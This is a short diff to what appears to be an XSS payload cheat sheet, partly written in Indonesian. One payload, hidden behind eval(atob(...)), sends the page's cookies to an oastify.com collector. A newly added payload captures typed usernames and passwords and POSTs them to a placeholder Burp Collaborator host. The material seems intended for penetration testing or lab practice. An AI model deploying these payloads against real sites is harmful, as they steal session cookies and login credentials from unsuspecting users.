@@ -138,3 +138,10 @@ link tag canonical pada `<head>` memungkinkan terjadinya XSS dengan menambahkan 
 <script>eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovL3o5OW9xYnFidzUxd3AxdzB4dzBmdTd1YXUxMHNvaWM3Lm9hc3RpZnkuY29tLz8iK2RvY3VtZW50LmNvb2tpZSwgdHJ1ZSk7Cnhoci5zZW5kKCk7'))</script>
 ```
 
+### Exploiting cross-site scripting to capture passwords
+**Payload** : 
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
+```
+
